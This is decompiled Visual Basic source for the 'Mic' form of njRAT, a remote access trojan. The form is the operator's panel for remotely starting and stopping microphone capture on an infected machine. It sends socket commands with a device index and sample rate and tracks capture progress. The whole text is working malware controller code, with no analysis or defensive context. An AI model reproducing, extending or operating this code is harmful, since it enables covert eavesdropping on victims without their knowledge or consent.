Imports System
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.Runtime.CompilerServices
Imports System.Windows.Forms
Imports Microsoft.VisualBasic.CompilerServices
Imports NJRAT.My.Resources

Namespace NJRAT
	' Token: 0x0200001E RID: 30
	<DesignerGenerated()>
	Public Partial Class Mic
		Inherits Form

		' Token: 0x170000D8 RID: 216
		' (get) Token: 0x0600027F RID: 639 RVA: 0x00017D21 File Offset: 0x00015F21
		' (set) Token: 0x06000280 RID: 640 RVA: 0x00017D2B File Offset: 0x00015F2B
		Friend Overridable Property ComboBox1 As ComboBox

		' Token: 0x170000D9 RID: 217
		' (get) Token: 0x06000281 RID: 641 RVA: 0x00017D34 File Offset: 0x00015F34
		' (set) Token: 0x06000282 RID: 642 RVA: 0x00017D40 File Offset: 0x00015F40
		Friend Overridable Property Button1 As Button
			<CompilerGenerated()>
			Get
				Return Me._Button1
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Button)
				Dim value2 As EventHandler = AddressOf Me.Button1_Click
				Dim button As Button = Me._Button1
				If button IsNot Nothing Then
					RemoveHandler button.Click, value2
				End If
				Me._Button1 = value
				button = Me._Button1
				If button IsNot Nothing Then
					AddHandler button.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170000DA RID: 218
		' (get) Token: 0x06000283 RID: 643 RVA: 0x00017D83 File Offset: 0x00015F83
		' (set) Token: 0x06000284 RID: 644 RVA: 0x00017D90 File Offset: 0x00015F90
		Friend Overridable Property vmethod_4 As Timer
			<CompilerGenerated()>
			Get
				Return Me._vmethod_4
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Timer)
				Dim value2 As EventHandler = AddressOf Me.vmethod_4_Tick
				Dim vmethod_ As Timer = Me._vmethod_4
				If vmethod_ IsNot Nothing Then
					RemoveHandler vmethod_.Tick, value2
				End If
				Me._vmethod_4 = value
				vmethod_ = Me._vmethod_4
				If vmethod_ IsNot Nothing Then
					AddHandler vmethod_.Tick, value2
				End If
			End Set
		End Property

		' Token: 0x170000DB RID: 219
		' (get) Token: 0x06000285 RID: 645 RVA: 0x00017DD3 File Offset: 0x00015FD3
		' (set) Token: 0x06000286 RID: 646 RVA: 0x00017DDD File Offset: 0x00015FDD
		Friend Overridable Property Label1 As Label

		' Token: 0x170000DC RID: 220
		' (get) Token: 0x06000287 RID: 647 RVA: 0x00017DE6 File Offset: 0x00015FE6
		' (set) Token: 0x06000288 RID: 648 RVA: 0x00017DF0 File Offset: 0x00015FF0
		Friend Overridable Property ComboBox2 As ComboBox

		' Token: 0x170000DD RID: 221
		' (get) Token: 0x06000289 RID: 649 RVA: 0x00017DF9 File Offset: 0x00015FF9
		' (set) Token: 0x0600028A RID: 650 RVA: 0x00017E03 File Offset: 0x00016003
		Friend Overridable Property ProgressBar1 As ProgressBar

		' Token: 0x0600028B RID: 651 RVA: 0x00017E0C File Offset: 0x0001600C
		Public Sub New()
			AddHandler MyBase.FormClosing, AddressOf Me.Mic_FormClosing
			AddHandler MyBase.Load, AddressOf Me.Mic_Load
			Me.QQ = String.Empty
			Me.InitializeComponent()
		End Sub

		' Token: 0x0600028C RID: 652 RVA: 0x00017E5C File Offset: 0x0001605C
		Private Sub Button1_Click(sender As Object, e As EventArgs)
			Dim flag As Boolean = Operators.CompareString(Me.Button1.Text, "Start", False) = 0
			If flag Then
				Me.Button1.Text = "Stop"
				Me.Button1.Image = Resources.control_pause_blue
				Me.ComboBox1.Enabled = False
				Me.ComboBox2.Enabled = False
				Dim value As Integer = 0
				Dim flag2 As Boolean = Me.ComboBox2.Text.Contains("16bit")
				If flag2 Then
					value = 1
				End If
				Me.sk.Send(String.Concat(New String() { "~", Class7.string_1, Me.ComboBox1.SelectedIndex.ToString(), Class7.string_1, Conversions.ToString(CInt(Math.Round(Math.Round(Conversions.ToDouble(Me.ComboBox2.Text.Split(New Char() { " "c })(0)) * 1024.0)))), Class7.string_1, Conversions.ToString(value) }))
			Else
				Me.sk.Send("~" + Class7.string_1 + "-1")
				Me.Button1.Image = Resources.control_play_blue
				Me.Button1.Text = "Start"
				Me.ComboBox1.Enabled = True
				Me.ComboBox2.Enabled = True
			End If
		End Sub

		' Token: 0x0600028D RID: 653 RVA: 0x00017FDC File Offset: 0x000161DC
		Private Sub Mic_FormClosing(sender As Object, e As FormClosingEventArgs)
			Try
				Dim cn As Boolean = Me.sk.CN
				If cn Then
					Me.sk.Send("~" + Class7.string_1 + "-1")
				End If
				Me.sk.CN = False
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x0600028E RID: 654 RVA: 0x0001805C File Offset: 0x0001625C
		Private Sub Mic_Load(sender As Object, e As EventArgs)
			Try
				Me.QQ = Conversions.ToString(RuntimeHelpers.GetObjectValue(Class7.smethod_1(Me.osk.L)))
				Me.Text = Class6.smethod_17(0L) + " " + Me.QQ
			Catch ex As Exception
			End Try
			Dim flag As Boolean = Me.ComboBox1.Items.Count = 0
			If flag Then
				MyBase.Close()
			Else
				Me.Button1.ImageAlign = ContentAlignment.MiddleLeft
				Me.Button1.Image = Resources.control_play_blue
				Me.ComboBox1.SelectedIndex = 0
				Dim flag2 As Boolean = Class7.class8_0.int_1 > Me.ComboBox2.Items.Count - 1
				If flag2 Then
					Class7.class8_0.int_1 = 0
				End If
				Me.ComboBox2.SelectedIndex = Class7.class8_0.int_1
				Dim bool_ As Boolean = Class7.class8_0.bool_8
				If bool_ Then
					Me.Button1_Click(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(sender)), e)
				End If
			End If
		End Sub

		' Token: 0x0600028F RID: 655 RVA: 0x00018198 File Offset: 0x00016398
		Private Sub vmethod_4_Tick(sender As Object, e As EventArgs)
			Try
				Dim flag As Boolean = Me.osk Is Nothing Or Me.sk Is Nothing
				If flag Then
					MyBase.Close()
					Return
				End If
				Dim flag2 As Boolean = Not Me.osk.CN Or Not Me.sk.CN
				If flag2 Then
					MyBase.Close()
				End If
			Catch ex As Exception
			End Try
			Me.ProgressBar1.Value = Me.sk.rp()
		End Sub

		' Token: 0x04000178 RID: 376
		Public osk As Client

		' Token: 0x04000179 RID: 377
		Public QQ As String

		' Token: 0x0400017A RID: 378
		Public sk As Client
	End Class
End Namespace
